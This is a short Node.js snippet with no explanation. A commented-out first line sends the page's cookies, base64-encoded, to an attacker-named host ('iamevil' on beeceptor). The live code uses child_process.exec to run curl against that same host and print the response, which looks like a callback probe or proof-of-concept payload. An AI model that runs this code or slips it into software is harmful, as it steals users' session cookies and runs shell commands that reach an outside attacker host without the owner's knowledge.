// document.location = 'https://iamevil.free.beeceptor.com/?cookie?c=' + btoa(document.cookie);
var exec = require('child_process').exec;

exec('curl https://iamevil.free.beeceptor.com',
    function (error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
             console.log('exec error: ' + error);
        }
    });
